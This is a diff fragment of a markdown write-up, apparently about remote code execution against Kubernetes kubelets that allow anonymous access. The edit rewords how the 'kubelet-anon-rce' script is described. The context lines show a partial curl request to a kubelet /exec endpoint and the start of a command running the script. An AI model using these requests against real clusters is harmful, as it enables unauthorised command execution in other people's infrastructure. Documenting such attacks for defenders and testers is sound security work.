@@ -121,7 +121,7 @@ $ curl -Gks https://10.1.2.3:10250/exec/kube-system/tiller-797d1b1234-gb6qt/till
 
 The request returns 302 redirect with a link to a stream that should be read with a websocket.
 
-The [`kubelet-anon-rce`](https://github.com/serain/kubelet-anon-rce) script automates both steps of running a command:
+The [`kubelet-anon-rce`](https://github.com/serain/kubelet-anon-rce) script automates issuing a command and streaming the response:
 
 ```
 $ python3 kubelet-anon-rce.py           \
